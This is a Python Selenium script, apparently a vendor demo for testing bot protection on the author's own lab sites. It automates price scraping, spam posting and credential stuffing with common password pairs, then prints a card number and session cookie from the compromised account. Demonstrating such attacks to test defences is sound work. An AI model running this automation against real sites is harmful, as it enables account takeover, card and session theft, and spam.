#!/usr/bin/env python
######################################################
## CREATED BY BARTOSZ CHMIELEWSKI                   ##
## bartosz.chmielewski@thalesgroup.com              ##
######################################################
#
# The script uses selenium framework to emulate advanced bot behavior. 
# 
#

from selenium import webdriver
from selenium.webdriver.firefox.options import Options as FirefoxOptions
from selenium.webdriver.chrome.options import Options as ChromeOptions
import time


ccounter = 0

def cclogin(delay, login, password):
    global ccounter
    ccounter = ccounter + 1
    print('Attempt: ', ccounter, '. Trying username: ', login, ' and password: ', password, '.', sep = '')
    loginform = browser.find_element('id', 'loginform')
    passwordform = browser.find_element('id', 'passwordform')
    if delay == 1: time.sleep(1)
    loginform.send_keys(login)
    if delay == 1: time.sleep(1)
    passwordform.send_keys(password)
    if delay == 1: time.sleep(1)
    browser.find_element('id', "submit").click()
    if delay == 1: time.sleep(1)

def sendspam(delay, text):
    inputform = browser.find_element('id', 'input')
    if delay == 1: time.sleep(2)
    print("Sending:", text)
    if delay == 1: time.sleep(1)
    inputform.send_keys(text)
    if delay == 1: time.sleep(1)
    browser.find_element('id', "submit").click()
    if delay == 1: time.sleep(2)



while True:
    data = input("Which website you would like to evaluate:\n\n 1) Direct Access (no ABP) \n 2) Protected by ABP\n\n")
    if data == '1':
        url = 'http://direct-lab.spm.pl/'
        break
    elif data == '2':
        url = 'http://lab.spm.pl/'
        break
        
        
while True:
    data = input("Select the browser mode: \n\n 1) Firefox\n 2) Firefox (headless)\n 3) Chrome\n 4) Chrome (headless)\n\n")
    if data == '1':
        print("\nLunching a FIREFOX browser...")
        options = FirefoxOptions()
        browser = webdriver.Firefox(options=options)
        break
    elif data == '3':
        print("\nLunching a CHROME browser...")
        options = ChromeOptions()
        browser = webdriver.Chrome(options=options)
        break
    elif data == '2':
        print("\nLunching a FIREFOX HEADLESS browser...")
        options = FirefoxOptions()
        options.add_argument("--headless")
        browser = webdriver.Firefox(options=options)
        break
    elif data == '4':
        print("\nLunching a CHROME HEADLESS browser...")
        options = ChromeOptions()
        options.add_argument("--headless")
        browser = webdriver.Chrome(options=options)
        break

while True:
    data = input("Select tests: \n\n 0) All Tests\n 1) Web Scraping\n 2) Web Spamming\n 3) Credential Cracking\n\n")
    if data == '0' or data == '1' or data == '2' or data == '3':
        break


print("Sending request to the website:", url)
browser.get(url)

time.sleep(2)

if data == '0' or data == '1':
    print("\n\n===SCRAPING USE CASE===")
    print("Lets see what are the prices today...\n")
    time.sleep(2)

    try:
        #browser.find_element_by_id("priceslink").click()
        browser.find_element("id", "priceslink").click()
        iphone = browser.find_element('id', 'iphone')
    except:
        print('I can\'t see the content!! Nothing to do here...')
        exit()

    print(iphone.text)
    time.sleep(2)
    samsung = browser.find_element('id', 'samsung')
    print(samsung.text)
    time.sleep(2)
    print("Done! Now I can update my prices to be a little lower then the competition :)")

    browser.find_element('id', 'goback').click()

    input("\nHit Enter when you are ready to move on!")

if data == '0' or data == '2':
    print("\n\n===SPAMMING USE CASE===")
    print("Lets now send some spam...")

    sendspam(1, 'This is a spam example [dfghgdfasgtndsdvxvzasdfasfdxz]')
    sendspam(1, 'This is another spam example [sgfashgfkshdfjhsfksahskh]')
    sendspam(0, 'SPAM: askjhfaskhfxzbewhrkhsgsahwgheagfdasafasgfas')
    sendspam(0, 'SPAM: askhgsghfjsdgfergtyuhfergfvdshagfjsgfzjcgsj')
    sendspam(0, 'SPAM: tiundkgbskbfhjsabfjsdbsafjkbvdfjvfjvjvsadjv')
    sendspam(0, 'SPAM: rtgbishfisgfagsfkgfjsgdhjgfsjgfajegfjsfsauf')
    sendspam(0, 'SPAM: sghhgdhjsgfjshabgfhjbgjhgwajhfgajsfjshjzgfj')
    sendspam(0, 'SPAM: tguyhgbhdjshgsjfghjsgjhdfzjsghfjsgjshgfsjhg')
    sendspam(0, 'SPAM: asgfdsffdkghdskjndfkjghkhkuhzgfkuasukfhkusz')
    sendspam(0, 'SPAM: yhilregnjdlhgkushfgskuhkudhfkaushfkaushfkus')
    sendspam(0, 'SPAM: cnycksufhkashkasdbfyjgtkshurtishgkaushfkaus')
    sendspam(0, 'SPAM: kjkgjdkugfakhfskfbyshkdusghfkahsgkaushfskdf')

    time.sleep(1)

    print("Done! I've sent some spam. I feel good now!")
    input("\nHit Enter when you are ready to move on!")


if data == '0' or data == '3':
    print("\n\n===CREDENTIAL CRACKING USE CASE===")

    print("Browsing to Login Website...")
    time.sleep(2)
    browser.find_element('id', "loginlink").click()

    print("Looks good. I see username and password fields!\n")


    cclogin(1, 'test1', 'test2')
    cclogin(1, 'john', 'smith')
    cclogin(1, 'stolenusername', 'stolenpassowrd')
    cclogin(0, 'username', 'easypassword')
    cclogin(0, 'user', 'Password')
    cclogin(0, 'testuser', 'testPassword')
    cclogin(0, 'imperva', 'imperva')
    cclogin(0, 'john', 'abc123')
    cclogin(0, 'admin', 'admin')
    cclogin(0, 'root', 'default')
    cclogin(0, 'secretuser', 'MyPetsName')
    cclogin(0, 'chuck', 'norris')
    cclogin(0, 'bartoszch', 'Test123123#')


    print("\n!!! I AM IN! Account hacked !!!")
    time.sleep(1)

    ccnumber = browser.find_element('id', 'cc')
    print("The Credit Card number is:", ccnumber.text)
    time.sleep(1)
    cookies = browser.get_cookies()
    print('The session ID is:', cookies[0]['value'])

    time.sleep(2)

input("\n\nI am done. Press Enter to continue...")

